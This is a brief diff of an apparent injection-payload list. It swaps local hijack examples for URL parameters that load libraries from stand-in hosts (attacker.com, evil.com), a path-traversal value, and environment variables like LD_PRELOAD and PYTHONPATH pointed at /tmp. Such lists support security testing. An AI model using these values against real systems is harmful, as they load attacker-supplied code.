@@ -1,5 +1,10 @@
-PATH=. command (current dir in PATH)
-LD_PRELOAD=/tmp/evil.so ./app
-PYTHONPATH=/tmp/evil python app.py
-export PATH=/tmp:$PATH
-DLL hijacking: drop evil.dll in application directory
+?path=http://attacker.com/evil.dll
+?lib=../../lib/malicious.so
+?plugin=http://evil.com/plugin.jar
+PATH=$PATH:/tmp (path injection)
+LD_PRELOAD=/tmp/evil.so
+LD_LIBRARY_PATH=/tmp
+PYTHONPATH=/tmp
+NODE_PATH=/tmp
+RUBYLIB=/tmp
+PERL5LIB=/tmp
